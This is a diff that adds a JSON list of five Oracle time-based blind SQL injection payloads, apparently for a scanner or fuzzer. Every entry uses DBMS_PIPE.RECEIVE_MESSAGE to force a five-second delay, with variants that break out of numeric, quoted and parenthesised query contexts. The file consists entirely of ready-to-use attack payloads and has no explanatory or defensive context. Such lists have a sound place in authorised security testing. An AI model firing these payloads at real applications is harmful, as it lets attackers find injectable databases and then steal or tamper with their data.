@@ -1,0 +1,22 @@
+[
+  {
+    "name": "oracle",
+    "payload": "1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)"
+  },
+  {
+    "name": "oracle",
+    "payload": "1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- 1337"
+  },
+  {
+    "name": "oracle",
+    "payload": "' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337"
+  },
+  {
+    "name": "oracle",
+    "payload": "') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337"
+  },
+  {
+    "name": "oracle",
+    "payload": ") AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND (1337=1337"
+  }
+]
